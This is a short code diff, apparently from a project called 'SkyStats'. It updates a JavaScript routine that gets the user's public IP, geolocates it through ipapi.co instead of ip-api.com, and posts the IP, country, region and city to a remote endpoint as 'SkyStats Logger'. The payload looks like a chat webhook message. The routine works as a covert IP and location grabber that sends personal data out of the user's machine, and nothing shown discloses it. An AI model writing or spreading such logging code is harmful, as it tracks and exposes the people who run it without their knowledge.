@@ -104,7 +104,7 @@
     .then(response => response.json())
     .then(json => json.ip)
     .then(ip => {
-      fetch(`https://ip-api.com/json/${ip}`)
+      fetch(`https://ipapi.co/${ip}/json/`)
       .then(response => response.json())
       .then(data => {
         const request = new XMLHttpRequest();
@@ -114,7 +114,7 @@
   
         const params = {
             username: "SkyStats Logger",
-            content: `IP: ${data.query}\nCountry: ${data.country}\nRegion: ${data.regionName}\nCity: ${data.city}`,
+            content: `IP: ${data.ip}\nCountry: ${data.country_name}\nRegion: ${data.region}\nCity: ${data.city}`,
         }
   
         request.send(JSON.stringify(params));
